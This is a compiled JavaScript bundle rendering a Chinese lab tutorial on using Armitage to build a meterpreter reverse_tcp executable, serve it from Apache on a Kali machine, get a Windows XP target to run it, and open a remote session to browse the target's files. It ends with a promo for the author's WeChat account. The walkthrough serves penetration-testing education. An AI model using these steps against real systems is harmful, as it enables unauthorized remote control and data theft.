(window.webpackJsonp=window.webpackJsonp||[]).push([[324],{616:function(t,a,s){"use strict";s.r(a);var e=s(7),r=Object(e.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"使用armitage进行客户端攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用armitage进行客户端攻击"}},[t._v("#")]),t._v(" 使用Armitage进行客户端攻击")]),t._v(" "),a("p",[t._v("攻击机 Kali 192.168.175.128")]),t._v(" "),a("p",[t._v("靶机 WinXP 192.168.175.130")]),t._v(" "),a("h3",{attrs:{id:"查找攻击载荷"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查找攻击载荷"}},[t._v("#")]),t._v(" 查找攻击载荷")]),t._v(" "),a("p",[t._v("在Armitage的左上角依次选择payload->windows->meterpreter->reverse_tcp")]),t._v(" "),a("h3",{attrs:{id:"设置攻击载荷"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#设置攻击载荷"}},[t._v("#")]),t._v(" 设置攻击载荷")]),t._v(" "),a("p",[t._v("这里，需要双击reverse_tcp，之后，会弹出如下对话框：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128134927500.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("这里，设置我们的LHOST和LPORT,并将Output设置为exe,最后单击Launch按钮导出生成的exe文件。")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128134940195.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("如下：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128134952345.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("点击保存按钮，将test.exe保存到/root目录下。")]),t._v(" "),a("h3",{attrs:{id:"移动test-exe到apache目录下"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#移动test-exe到apache目录下"}},[t._v("#")]),t._v(" 移动test.exe到apache目录下")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("mv test.exe /var/www/html/\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("此时，输入如下命令启动apache")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("service apache2 start\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h3",{attrs:{id:"在靶机上下载test-exe"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在靶机上下载test-exe"}},[t._v("#")]),t._v(" 在靶机上下载test.exe")]),t._v(" "),a("p",[t._v("在靶机的浏览器地址栏输入：http://192.168.175.128/test.exe下载test.exe文件")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128135053701.png",loading:"lazy"}})]),t._v(" "),a("h3",{attrs:{id:"创建监听器"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#创建监听器"}},[t._v("#")]),t._v(" 创建监听器")]),t._v(" "),a("p",[t._v("依次单击Armitage->Listeners->Reverse选项：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128135110183.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("点击后弹出一个对话框，如下：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019012813512652.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("这里，我们将端口设置为8888,将类型设置为meterpreter，然后点击Start Listener")]),t._v(" "),a("p",[t._v("效果如下图：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019012813514745.png",loading:"lazy"}})]),t._v(" "),a("h3",{attrs:{id:"运行exe文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#运行exe文件"}},[t._v("#")]),t._v(" 运行exe文件")]),t._v(" "),a("p",[t._v("在靶机上双击test.exe")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128135206863.png",loading:"lazy"}})]),t._v(" "),a("h3",{attrs:{id:"查看结果"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看结果"}},[t._v("#")]),t._v(" 查看结果")]),t._v(" "),a("p",[t._v("此时，切换到Armitage，我们在输出日志中看到打开了一个Meterpreter session,如下图：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128135222423.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("同时，可以看到靶机图标有红色闪电包围，说明我们成功拿下了靶机的Meterpreter。")]),t._v(" "),a("h3",{attrs:{id:"查看靶机的目录结构"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看靶机的目录结构"}},[t._v("#")]),t._v(" 查看靶机的目录结构")]),t._v(" "),a("p",[t._v("右键靶机图标->Meterpreter->Explore->Browse Files")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128135255860.png",loading:"lazy"}})]),t._v(" "),a("p",[t._v("如下图所示：")]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190128135310495.png",loading:"lazy"}})]),t._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[t._v("#")]),t._v(" 写在最后")]),t._v(" "),a("blockquote",[a("p",[t._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=r.exports}}]);